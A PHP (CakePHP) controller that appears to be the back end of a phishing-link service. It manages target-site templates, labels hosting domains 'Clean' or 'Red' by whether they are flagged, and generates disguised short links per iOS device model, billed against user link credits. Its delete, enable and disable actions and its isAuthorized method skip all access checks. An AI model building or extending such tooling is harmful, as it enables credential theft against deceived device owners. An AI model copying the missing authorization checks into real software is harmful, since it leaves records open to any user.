<?php
App::uses('CakeTime','Utility');
class ScriptsController extends AppController {
	public $components = array('DatabaseFunction', 'ConditionBuilder');
	public $default_conditions = array();
	
	public function index() {
		if($this->Auth->user('role')!=='Administrator'){
			$this->Session->setFlash('Warning, You are not allowed to access this page!', 'alert.error');
			return $this->redirect(array('controller' => 'users', 'action' => 'dashboard'));
		}
		
		$data =  $this->get_scripts(array());
		$this->set('data',$data['data']);
		if(isset($this->request->query['layout']) && $this->request->query['layout']=='ajax'){
			$this->autoRender = false;
			echo json_encode($data);
		}
	}
	
	public function delete_script($id){
		$this->autoRender = false;
		$this->loadModel('Script');
		$this->DatabaseFunction->delete_record(
			$this->Script, 
			$id,
			true,
			'Script'
		);
	}
	
	public function disable_script($id){
		$this->autoRender = false;
		$this->loadModel('Script');
		$this->DatabaseFunction->disable_record(
			$this->Script, 
			$id,
			true
		);
	}
	
	public function enable_script($id){
		$this->autoRender = false;
		$this->loadModel('Script');
		$this->DatabaseFunction->enable_record(
			$this->Script, 
			$id,
			true
		);
	}
	
	public function delete_selected_script(){
		$id = $this->request->data['id'] ?? array();
		$id = (!is_array($id) ? json_decode($id,true) : $id);
		
		$this->autoRender = false;
		$this->loadModel('Script');
		$this->DatabaseFunction->delete_record(
			$this->Script, 
			$id,
			true,
			'Script'
		);
	}
	
	public function enable_selected_script(){
		
		$id = $this->request->data['id'] ?? array();
		$id = (!is_array($id) ? json_decode($id,true) : $id);
		
		$this->autoRender = false;
		$this->loadModel('Script');
		$this->DatabaseFunction->enable_record(
			$this->Script, 
			$id,
			true
		);
	}
	
	public function disable_selected_script(){
		$id = $this->request->data['id'] ?? array();
		$id = (!is_array($id) ? json_decode($id,true) : $id);
		
		$this->autoRender = false;
		$this->loadModel('Script');
		$this->DatabaseFunction->disable_record(
			$this->Script, 
			$id,
			true
		);
	}
	
	public function add_script(){
		$this->autoRender = false;
		if($this->Auth->user('role')!=='Administrator'){
			$this->Session->setFlash('Warning, You are not allowed to access this page!', 'alert.error');
			return $this->redirect(array('controller' => 'users', 'action' => 'dashboard'));
		}
		
		if ($this->request->is('post') || $this->request->is('put')) {
		
			$file_name = $this->request->data['Script']['script_img']['name'];
			$file_ext = pathinfo($file_name, PATHINFO_EXTENSION);
			$origin_path = $this->request->data['Script']['script_img']['tmp_name'];
			$allowed_ext = array("png", "jpeg", "gif", 'jpg');
			
			$new_file_name = md5($this->Auth->user('id').'-'.time()).".$file_ext";
			$output_path = "img/script/$new_file_name";
				
			if (!empty($file_name)){
				if(in_array($file_ext, $allowed_ext)){
					if(move_uploaded_file($origin_path, $output_path)){
						$this->request->data['Script']['script_img'] = $output_path;
					}else{
						$this->request->data['Script']['script_img'] = 'img/script/noimage.png';
					}
				}else{
					$this->Session->setFlash("Failed to upload file. Please upload a valid image file.", 'alert.error');
					return $this->redirect(array('controller' => 'scripts', 'action' => 'index'));
				}
			}else{
				unset($this->request->data['Script']['script_img']);
			}
		}
		
		$redirect_url_success = array('controller' => 'scripts', 'action' => 'index');
		$this->loadModel('Script');
		$this->DatabaseFunction->add_record(
			$this->Script, 
			false,
			'Script',
			$redirect_url_success,
			$redirect_url_success
		);

	}
	
	
	public function edit_script(){
		$this->autoRender = false;
		if($this->Auth->user('role')!=='Administrator'){
			$this->Session->setFlash('Warning, You are not allowed to access this page!', 'alert.error');
			return $this->redirect(array('controller' => 'users', 'action' => 'dashboard'));
		}
		
		if ($this->request->is('post') || $this->request->is('put')) {
			
			$this->request->data['Script'] = $this->request->data['EditScript'];
			unset($this->request->data['EditScript']);
			
			$file_name = $this->request->data['Script']['script_img']['name'];
			$file_ext = pathinfo($file_name, PATHINFO_EXTENSION);
			$origin_path = $this->request->data['Script']['script_img']['tmp_name'];
			$allowed_ext = array("png", "jpeg", "gif", 'jpg');
			
			$new_file_name = md5($this->Auth->user('id').'-'.time()).".$file_ext";
			$output_path = "img/script/$new_file_name";
				
			if (!empty($file_name)){
				if(in_array($file_ext, $allowed_ext)){
					if(move_uploaded_file($origin_path, $output_path)){
						$this->request->data['Script']['script_img'] = $output_path;
					}else{
						$this->request->data['Script']['script_img'] = 'img/script/noimage.png';
					}
				}else{
					$this->Session->setFlash("Failed to upload file. Please upload a valid image file.", 'alert.error');
					return $this->redirect(array('controller' => 'scripts', 'action' => 'index'));
				}
			}else{
				unset($this->request->data['Script']['script_img']);
			}
		}
		
		$redirect_url_success = array('controller' => 'scripts', 'action' => 'index');
		$this->loadModel('Script');
		$this->DatabaseFunction->edit_record(
			$this->Script, 
			false,
			'Script',
			$redirect_url_success
		);

	}
	
	
	private function get_scripts($submitted_conditions = array()) {
		$this->default_conditions = array_merge($this->default_conditions, $submitted_conditions);
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_string_equivalent('Script.id', 'id'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('Script.name', 'name'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('Script.web', 'folder'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_wildcard('Script.web', 'web'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_string_equivalent('Script.map', 'map'));
		$this->default_conditions = array_merge($this->default_conditions, $this->ConditionBuilder->build_ajax_string_equivalent('Script.status', 'status'));
		
		$pagination_fields = array();

		$pagination_fields_reorder = array(
			'Script.id',
			'Script.name',
			'Script.folder',
			'Script.web',
			'Script.map',
			'Script.map_desc',
			'Script.status',
			'Script.status_desc',
		);
		
		$searchable_fields = array(
			'Script.name',
			'Script.web',
			'Script.folder',
			'Script.map_desc',
			'Script.status_desc',
		);
		
		$default_order = array();
		$default_contain = array();
		$default_conditions = array();
		$default_joins = array();
		$default_group = array();
		$default_recursive = -1;
		
		$this->loadModel('Script');
		$data = $this->DatabaseFunction->get_data_table_ajax_records(
			$this->Script,
			$pagination_fields,
			$pagination_fields_reorder,
			$searchable_fields,
			array(),
			array(),
			$default_contain,
			$this->default_conditions,
			$default_order,
			$default_recursive,
			$default_joins,
			$default_group,
			true
		);
		
		foreach($data['data'] as $key=>$value){
			$update_data = htmlspecialchars(json_encode($value));
			$update_data = "<input class=\"update_data\" type=\"hidden\" value=\"$update_data\"/>";
			
			if($value['Script.status_desc'] == 'Active'){
				$data['data'][$key]['Script.status_desc'] = '<span class="mb-1 badge bg-success">Active</span>';
			}else{
				$data['data'][$key]['Script.status_desc'] = '<span class="mb-1 badge bg-danger">Disabled</span>';
			}
			
			if($value['Script.map'] == 1){
				$data['data'][$key]['Script.map_desc'] = '<span class="mb-1 badge bg-success">Yes</span>';
			}else{
				$data['data'][$key]['Script.map_desc'] = '<span class="mb-1 badge bg-danger">No</span>';
			}
			
			$data['data'][$key]['Script.map_desc'] .= $update_data;
			unset($data['data'][$key]['Script.status']);
			unset($data['data'][$key]['Script.map']);
		}
		
		return $data;

	}
	
	private function generate_url($domain_id,$length=3){
		$retry_count = 1;		
regenerate_link:
		$this->loadModel('GeneratedLink');
		$generated_string = generateRandomString($length);
		$result = $this->GeneratedLink->find('count',array(
			'conditions'=>array(
				'GeneratedLink.generated_string' => $generated_string,
				'GeneratedLink.domain_id' => $domain_id
			),
			'recursive'=>-1
		));
		
		if($result >=1 && $length < 10){
			$retry_count+=1;
			if($retry_count >=3){
				$retry_count= 1;
				$length+=1;
				goto regenerate_link;
			}else{
				goto regenerate_link;
			}
		}
		return $generated_string;
	}
	
	public function generate_link() {
		$domain_conditions = array();
		if($this->Auth->user('role')!=='Administrator'){
			
			$private_domain = $this->getAllDBList('UserDomain',array('domain_id','id'),array('UserDomain.user_id'=>$this->Auth->user('id')),'private_domain_list');
			$private_domain_ids = array_keys($private_domain);
			$domain_conditions = array(
    			'OR'=>array(
    			    'Domain.is_for_all'=>1,
    			    'Domain.id' => $private_domain_ids
    			),
    			'Domain.status'=>1
			);
			
		}
		$domain_list = $this->getAllDBList('Domain',array('id','name'),$domain_conditions,'domain_list');
		foreach($domain_list as $key=>$value){
			$domain = $value;
			$domain_status = $this->checkDomainStatus($domain);
			if($domain_status == 1){
				$domain_list[$key] = $domain .' <span class="badge bg-success p-1">Clean</span>';
			}else{
				$domain_list[$key] = $domain .' <span class="badge bg-danger p-1">Red</span>';
			}
		}
		$this->set('domain_list',$domain_list);
		
		
		$script_list = $this->Script->find('all',array(
			'fields'=>array(
				'Script.id as value',
				'Script.name as name',
				'Script.web as web',
				'Script.map as map',
				'Script.script_img as img',
			),
			'order'=>'Script.name ASC',
			'conditions'=>array(
				'Script.status'=>1
			)
		));
		$script_list = Set::extract($script_list, '{n}.Script');
		$this->set('script_list',$script_list);
		
		$supported_web = json_encode(getSupportedWeb());
		$this->set('supported_web',$supported_web);
		
		$device_list = get_ios_devices();
		$this->set('device_list',$device_list);
	}
	
	
	public function start_generate(){
		$this->autoRender = false;
		if ($this->request->is('post') || $this->request->is('put')) {
			
			$credit_validation = $this->validate_user_credits('link_credits');
			if($credit_validation['success'] == false){
				echo json_encode($credit_validation);
				exit();
			}
			
			$domain_id = $this->request->data['GeneratedLink']['domain_id'];
			
			$this->loadModel('Domain');
			$domain_data = $this->Domain->findById($domain_id);
			if(count($domain_data)>=1){
				$domain_url = $domain_data['Domain']['name'];
				
				$device_class = $this->request->data['GeneratedLink']['device_class'] ?? '';
				$device_model = (trim($device_class)!=='' ? get_ios_devices($device_class) : '');
				
				$generated_string = $this->generate_url($domain_id);
				$link = "$domain_url/help?$generated_string";
				$short_link = "$domain_url/$generated_string";
				
				$this->request->data['GeneratedLink']['generated_string'] = $generated_string;
				$this->request->data['GeneratedLink']['link'] = $link;
				$this->request->data['GeneratedLink']['shorten_link'] = $short_link;
				$this->request->data['GeneratedLink']['user_id'] = $this->Auth->user('id');
				$this->request->data['GeneratedLink']['device_model'] = $device_model;
				$this->request->data['GeneratedLink']['creator_ip'] = getUserIP();
				
				if(!isset($this->request->data['GeneratedLink']['autoremove'])){
    				$this->request->data['GeneratedLink']['autoremove'] = 0;
    			}
		
				$this->loadModel('GeneratedLink');
				if($this->GeneratedLink->save($this->request->data)) {
					
					$user_data = $credit_validation['data'];
					$this->User->save($user_data);
		
					$response['success'] = true;
					$response['link'] = $link;
					$response['shorten_link'] = $short_link;
					
					echo json_encode($response);
					
				}else{
					
					$err =array(); 
					foreach($this->GeneratedLink->validationErrors as $key=>$value){
						array_push($err,$value[0]);
						break;
					}
					
					$response['success'] = false;
					$response['msg'] = $err[0];
					echo json_encode($response);
					
				}
				
			}else{
				$this->response->statusCode(404);
			}
		}else{
			$this->response->statusCode(403);
		}
	}

	
	public function isAuthorized($user) {
		return true;
	}

}
?>